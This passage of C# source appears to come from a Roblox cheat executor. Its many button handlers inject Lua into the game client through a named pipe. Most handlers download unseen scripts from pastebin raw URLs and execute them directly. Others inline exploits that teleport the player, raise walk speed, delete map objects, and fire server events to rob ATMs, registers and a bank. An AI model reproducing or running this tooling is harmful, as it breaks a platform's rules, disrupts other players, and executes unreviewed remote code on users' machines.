      NamedPipes.LuaPipe("_G.WalkSpeed = 150 local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitWS ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed end) _G.InitWS = true end");
    }

    private void flatButton420_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/AYJ5tBSC"));
      Thread.Sleep(100);
    }

    private void flatButton417_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/0Ja55YHf"));
      Thread.Sleep(100);
    }

    private void flatButton421_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1608.924, 100.43, 1620.324) + Vector3.new(1,0,0) end");
    }

    private void flatButton422_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1755.77, 21.748, -1421.558) + Vector3.new(1,0,0) end");
    }

    private void flatButton424_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace.Teams:Destroy()");
    }

    private void flatButton425_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Workspace.Vehicles:Destroy()");
    }

    private void flatButton423_Click(object sender, EventArgs e)
    {
    }

    private void flatButton427_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/bSZWdXie"));
      Thread.Sleep(100);
    }

    private void flatButton428_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/VuubzvW2"));
      Thread.Sleep(100);
    }

    private void flatButton429_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/bFed9pRV"));
      Thread.Sleep(100);
    }

    private void flatButton430_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1775.183, 291.671, -1499.308) + Vector3.new(1,0,0) end");
    }

    private void flatButton431_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(793, 37.814, -1658) + Vector3.new(1,0,0) end");
    }

    private void flatButton432_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1489, 17.5, -1279) + Vector3.new(1,0,0) end");
    }

    private void flatButton433_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1948, 18.915, -586) + Vector3.new(1,0,0) end");
    }

    private void flatButton434_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1648.779, 20.521, 267.594) + Vector3.new(1,0,0) end");
    }

    private void flatButton435_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("for i = 1,55 do wait(.08) game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1052, 117.9, 2035) + Vector3.new(1,0,0) end");
    }

    private void flatButton436_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/qAd3t8pE"));
      Thread.Sleep(100);
    }

    private void flatButton439_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/qbcL5R5U"));
      Thread.Sleep(100);
    }

    private void flatButton440_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/tzTXmYf2"));
      Thread.Sleep(100);
    }

    private void flatButton441_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/u7JbTkKV"));
      Thread.Sleep(100);
    }

    private void flatButton443_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/u7JbTkKV"));
      Thread.Sleep(100);
    }

    private void flatButton444_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/0MyS2fBE"));
      Thread.Sleep(100);
    }

    private void flatButton445_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/UJHi5jrp"));
      Thread.Sleep(100);
    }

    private void flatButton446_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/KM0bQqvf"));
      Thread.Sleep(100);
    }

    private void flatButton447_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/UwKKb0Uz"));
      Thread.Sleep(100);
    }

    private void flatButton448_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/7qc4ERAd"));
      Thread.Sleep(100);
    }

    private void flatButton449_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/emDJiS9Y"));
      Thread.Sleep(100);
    }

    private void flatButton450_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/aYYAD198"));
      Thread.Sleep(100);
    }

    private void flatButton451_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/u7JbTkKV"));
      Thread.Sleep(100);
    }

    private void flatButton452_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/G5hV0JvR"));
      Thread.Sleep(100);
    }

    private void flatButton453_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/XGdYRfZK"));
      Thread.Sleep(100);
    }

    private void flatButton455_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/N67ekfN9"));
      Thread.Sleep(100);
    }

    private void flatButton456_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/u7JbTkKV"));
      Thread.Sleep(100);
    }

    private void flatButton457_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/wCjUEt57"));
      Thread.Sleep(100);
    }

    private void flatButton458_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/wCjUEt57"));
      Thread.Sleep(100);
    }

    private void flatButton454_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/3gN5NqHQ"));
      Thread.Sleep(100);
    }

    private void flatButton459_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/jLUGcEpP"));
      Thread.Sleep(100);
    }

    private void flatButton460_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/JfGBxKEq"));
      Thread.Sleep(100);
    }

    private void flatButton461_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/wCjUEt57"));
      Thread.Sleep(100);
    }

    private void flatButton462_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/XTSntjZU"));
      Thread.Sleep(100);
    }

    private void flatButton463_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ZsgS9isx"));
      Thread.Sleep(100);
    }

    private void flatButton464_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/mjd2ngYr"));
      Thread.Sleep(100);
    }

    private void flatButton465_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/GQb8Lz9L"));
      Thread.Sleep(100);
    }

    private void flatButton468_Click(object sender, EventArgs e)
    {
    }

    private void flatButton470_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2138, 25, 392)");
    }

    private void flatButton466_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1055, 52, -3083)");
    }

    private void flatButton467_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Vector3.new(216.656052, 24.7832451, -614.467163)");
    }

    private void flatButton468_Click_1(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Vector3.new(-1616.53979,41.8001175,687.908203)");
    }

    private void flatButton469_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Vector3.new(-204.785858,24.5781498,723.530945)");
    }

    private void flatButton471_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-274, 29, 785)");
    }

    private void flatButton472_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1749, 75, 1601)");
    }

    private void flatButton479_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Vector3.new(1789.11084,24.7000046,695.744507)");
    }

    private void flatButton478_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1660, 25, 525)");
    }

    private void flatButton477_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game.Players.LocalPlayer.Character.HumanoidRootPart.Position = Vector3.new(692.542908, 24.8893394,445.545685)");
    }

    private void flatButton476_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("game:service'Players'.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(758, 0, 478)");
    }

    private void flatButton475_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("\tlocal ev = game.Workspace.ObjectSelection.Grenade.Grenade.Grenade['Event']\r\nev:FireServer()\r\nlocal shotty = game.Workspace.ObjectSelection.Shotgun.Shotgun.Shotgun['Event']\r\nshotty:FireServer()\r\nlocal uziithink = game.Workspace.ObjectSelection.MP5.MP5.MP5['Event']\r\nuziithink:FireServer()\r\nlocal knife = game.Workspace.ObjectSelection.TEC9.TEC9.TEC9['Event']\r\nknife:FireServer()");
    }

    private void flatButton474_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("\tlocal WS = game:GetService('Workspace')\r\nlocal ObjectSelection = WS:WaitForChild('ObjectSelection')\r\nfor _,v in pairs (ObjectSelection:GetChildren()) do \r\nif v.Name == 'CashRegister' then \r\nif v:FindFirstChild('SmashCash') then \r\nlocal Event = v.SmashCash.SmashCash.Event\r\nEvent:FireServer()\r\nend\r\nend\r\nif v.Name == 'ATM' then \r\nif v:FindFirstChild('ATM') then\r\nlocal Event = v.ATM.ATM.Event\r\nEvent:FireServer()\r\nend\r\nend\r\nif v.Name == 'Cash' then \r\nif v:FindFirstChild('Cash') then \r\nlocal Event = v.Cash.Cash.Event\r\nEvent:FireServer()\r\nend\r\nend\r\nif v.Name == 'DiamondBox' then \r\nif v:FindFirstChild('SmashCash') then \r\nlocal Event = v.SmashCash.SmashCash.Event\r\nEvent:FireServer()\r\nend\r\nend\r\nif v.Name == 'Safe' then \r\nif v:FindFirstChild('SmashCash') then \r\nlocal Event = v.SmashCash.SmashCash.Event\r\nEvent:FireServer()\r\nend\r\nend\r\nif v.Name == 'SlotMachine' then \r\nif v:FindFirstChild('SlotMachine') then \r\nlocal Event = v.SlotMachine.SlotMachine.Event\r\nEvent:FireServer()\r\nend\r\nend\r\nend");
    }

    private void flatButton473_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("print('Only works if bank is open')\r\nfor i, v in pairs(workspace:GetDescendants()) do\r\nif v.Name == 'Lasers' thenv\r\nv:Destroy()\r\nend\r\nend\r\nlocal w = game:GetService('Workspace')\r\nlocal ObjectSelection = w:WaitForChild('ObjectSelection')\r\nfor _,v in pairs (ObjectSelection:GetChildren()) do \r\nif v.Name == 'HackComputer' then \r\nif v:FindFirstChild('HackComputer') then \r\nlocal Event = v.HackComputer.HackComputer.Event\r\nEvent:FireServer()\r\nend\r\nend\r\nend\r\nprint('Hacked')\r\nplayer.Character.HumanoidRootPart.CFrame = CFrame.new(736.92687988281,0.094430387020111,497.45889282227)\r\nwait(2)\r\nplayer.Character.HumanoidRootPart.CFrame = CFrame.new(734.74481201172, -0.10518385469913, 516.45111083984)\r\nwait(10)\r\nplayer.Character.HumanoidRootPart.CFrame = CFrame.new(770.81366, 0.093537762761116, 489.25299072266)\r\nwait(10)\r\ngame.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2116.2019042969,25.10528755188,348.36651611328)\r\nwait(1)\r\ngame.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2116.2019042969,25.10528755188,348.36651611328)");
    }

    private void flatButton480_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ypjxDmyv"));
      Thread.Sleep(100);
    }

    private void flatButton481_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/w2KhJz3x"));
      Thread.Sleep(100);
    }

    private void flatButton482_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/WTmDt8sH"));
      Thread.Sleep(100);
    }

    private void flatButton483_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/nM87DKXp"));
      Thread.Sleep(100);
    }

    private void flatButton484_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/EVXMZv1N"));
      Thread.Sleep(100);
    }

    private void flatButton485_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/4L022EER"));
      Thread.Sleep(100);
      int num = (int) MessageBox.Show("Type ';toggle' in chat to enable/disable");
    }

    private void flatButton486_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/aQKVScxs"));
      Thread.Sleep(100);
    }

    private void flatButton487_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/eeYQBreS"));
      Thread.Sleep(100);
    }

    private void flatButton489_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/XE4Hdm6i"));
      Thread.Sleep(100);
    }

    private void flatButton488_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/1H81dHWX"));
      Thread.Sleep(100);
    }

    private void flatButton491_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/mvtjvzah"));
      Thread.Sleep(100);
    }

    private void flatButton490_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/wCjUEt57"));
      Thread.Sleep(100);
    }

    private void flatButton492_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/18YWKgc9"));
      Thread.Sleep(100);
    }

    private void flatButton493_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/jB8W6cP9"));
      Thread.Sleep(100);
    }

    private void flatButton494_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.WalkSpeed = 100 local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitWS ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed end) _G.InitWS = true end");
    }

    private void flatButton495_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/RZgjHbzu"));
      Thread.Sleep(100);
    }

    private void flatButton496_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/DzH3Q06m"));
      Thread.Sleep(100);
    }

    private void flatButton497_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/jA9EvyxM"));
      Thread.Sleep(100);
    }

    private void flatButton498_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton499_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/30AEvkhc"));
      Thread.Sleep(100);
    }

    private void flatButton500_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/P1dfDu1Y"));
      Thread.Sleep(100);
    }

    private void flatButton501_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/7tH9Nzjz"));
      Thread.Sleep(100);
    }

    private void flatButton502_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/YWTNwHak"));
      Thread.Sleep(100);
    }

    private void flatButton503_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/6mnAHNUT"));
      Thread.Sleep(100);
    }

    private void flatButton504_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/AGafXArc"));
      Thread.Sleep(100);
    }

    private void flatButton505_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/xm81T8sa"));
      Thread.Sleep(100);
    }

    private void flatButton506_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton507_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/DsF0mAML"));
      Thread.Sleep(100);
    }

    private void flatButton509_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/kne3KkSa"));
      Thread.Sleep(100);
    }

    private void flatButton510_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/rDCLH9dh"));
      Thread.Sleep(100);
    }

    private void flatButton511_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton512_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Q9bm09BJ"));
      Thread.Sleep(100);
    }

    private void flatButton513_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/LfWdzuws"));
      Thread.Sleep(100);
    }

    private void flatButton514_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.WalkSpeed = 250 local run = game:GetService('RunService') local players = game:GetService('Players') if _G.InitWS ~= true then run.Heartbeat:connect(function() players.LocalPlayer.Character.Humanoid.WalkSpeed = _G.WalkSpeed end) _G.InitWS = true end");
    }

    private void flatButton515_Click(object sender, EventArgs e)
    {
      Process.Start("https://wishes2.com/Pb5p");
    }

    private void flatButton516_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/SuKwXQKq"));
      Thread.Sleep(100);
    }

    private void flatButton517_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/H1ALQReJ"));
      Thread.Sleep(100);
    }

    private void flatButton518_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/D4agi8WY"));
      Thread.Sleep(100);
    }

    private void flatButton519_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/wFR5mpwh"));
      Thread.Sleep(100);
    }

    private void flatButton520_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/YcH7izjT"));
      Thread.Sleep(100);
    }

    private void flatButton521_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/2gYUKaYG"));
      Thread.Sleep(100);
      int num = (int) MessageBox.Show("Must buy something before you get the money");
    }

    private void flatButton522_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/LrHAXKv6"));
      Thread.Sleep(100);
    }

    private void flatButton523_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/qY7MYhR0"));
      Thread.Sleep(100);
    }

    private void flatButton524_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/NRCJDie9"));
      Thread.Sleep(100);
    }

    private void flatButton525_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/ZyqC5icy"));
      Thread.Sleep(100);
    }

    private void flatButton526_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/EYDFzNjG"));
      Thread.Sleep(100);
    }

    private void flatButton527_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/37VjBE9F"));
      Thread.Sleep(100);
    }

    private void flatButton529_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton528_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/pCVy8aPQ"));
      Thread.Sleep(100);
    }

    private void flatButton530_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/DCdeK1U9"));
      Thread.Sleep(100);
    }

    private void flatButton532_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/MJpRuL0R"));
      Thread.Sleep(100);
    }

    private void flatButton533_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton534_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/kYdFd2y0"));
      Thread.Sleep(100);
    }

    private void flatButton535_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/rHmWfj2y"));
      Thread.Sleep(100);
    }

    private void flatButton536_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton537_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton538_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/9Zk6Hp1h"));
      Thread.Sleep(100);
    }

    private void flatButton539_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/mJDe2C94"));
      Thread.Sleep(100);
    }

    private void flatButton540_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("_G.iEnabledOrNot = true; local pPlayerMouse = game:GetService('Players').LocalPlayer:GetMouse(); local uUserService = game:GetService('UserInputService'); pPlayerMouse.Button1Down:connect(function() if (_G.iEnabledOrNot) then if (uUserService:IsKeyDown(Enum.KeyCode.LeftAlt)) then if (pPlayerMouse.Target) then pPlayerMouse.Target:Destroy() return true; else return false; end return true; else return false; end else return false; end end)");
    }

    private void flatButton541_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Gs2mqcwM"));
      Thread.Sleep(100);
    }

    private void tabPage100_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/mJDe2C94"));
      Thread.Sleep(100);
    }

    private void flatButton542_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/3P9hHy0X"));
      Thread.Sleep(100);
    }

    private void flatButton543_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/gggRwfGC"));
      Thread.Sleep(100);
    }

    private void flatButton544_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/4KKBkeXM"));
      Thread.Sleep(100);
    }

    private void flatButton545_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/MvitVdp1"));
      Thread.Sleep(100);
    }

    private void flatButton546_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Rsmy5CYE"));
      Thread.Sleep(100);
    }

    private void flatButton547_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/7jeMPMLu"));
      Thread.Sleep(100);
    }

    private void flatButton549_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/rgEG6HdD"));
      Thread.Sleep(100);
    }

    private void flatButton555_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/Eu3st7FE"));
      Thread.Sleep(100);
      int num = (int) MessageBox.Show("Press T To Activate", "JAILBREAK CMD", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    private void flatButton554_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe(this.webClient.DownloadString("https://pastebin.com/raw/3N4rjEJq"));
      Thread.Sleep(100);
      int num = (int) MessageBox.Show("YOU CAN NOW LOOK TRUE EVERYTHING", "JAILBREAK CMD", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
